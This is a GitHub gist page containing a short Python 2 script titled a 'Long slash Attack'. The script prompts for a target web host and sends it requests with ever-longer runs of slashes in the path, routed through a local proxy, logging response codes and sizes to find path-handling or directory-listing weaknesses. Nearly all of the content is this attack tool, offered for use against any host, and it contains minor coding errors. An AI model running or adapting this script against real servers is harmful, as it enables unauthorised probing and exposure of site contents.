Skip to content
 
 
Search…
All gists
GitHub
New gist @arbazhussain149
  Star 0
  Fork 0
  @YasserGersyYasserGersy/longslashattack.py
Last active 2 months ago
Embed  
<script src="https://gist.github.com/YasserGersy/1608b3e03e0faed9e2700b2f16ed93ef.js"></script>
  Download ZIP
 Code  Revisions 3
longslashattack.py
Raw
 longslashattack.py
import httplib, urllib




print	"|------------------------------------------------------------|"
print	"|------------------------------------------------------------|"
print	"|------------------------Classic-----------------------------|"
print	"|------------        Long slash Attack        ---------------|"
print	"|------------                By               ---------------|"
print	"|------------            @YasserGersy         ---------------|"
print	"|------------------------------------------------------------|"
print	"|------------------------------------------------------------|"

cont="texh/html"
host='http://google.com'
params=''
req=1

 

h=raw_input('\n\nHost (eg google.com) : ').lower()
host=h

if not host.startswith('http'):
	host = "http://"+host


if len(host)<9:
	exit()



method = raw_input("\n\nMethod (POST,GET .. etc):")
if(len(method)<1):
	method='GET'

if method =="POST":
	cont='application/x-www-form-urlencoded'
try:
	count=input('\n\nHow many requests ?')
except:
	count=100

conunt=int(count)




#params = urllib.urlencode({'spam': 1, 'eggs': 2, 'bacon': 0})
headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
 "Accept": "*",
 "Content-type": cont,
 "Accept-Language": "en-US,en;q=0.8,ar;q=0.6",
 "Referer": host
 }

def doi(x):
	conn = httplib.HTTPConnection('127.0.0.1:8080')
	conn.request(method, host+x, params, headers)
	response = conn.getresponse()
	data = response.read()
	print "[Request",len(x)+1,(' ' if len(x) <9 else ''),"]   [ ",response.status,"][",response.reason ,"]     [Content-Length > ",len(data),"]   [URI]>[",host+x,"]"

	conn.close()
	


for i in range(0,count):
	s = "/" * i
	doi(s)


print '---------------------------Done--------------------------------------------------\n'
 @arbazhussain149
  
         
Write  Preview

Leave a comment
Attach files by dragging & dropping,  Choose Files selecting them, or pasting from the clipboard.
 Styling with Markdown is supported
Comment
Contact GitHub API Training Shop Blog About
© 2016 GitHub, Inc. Terms Privacy Security Status Help
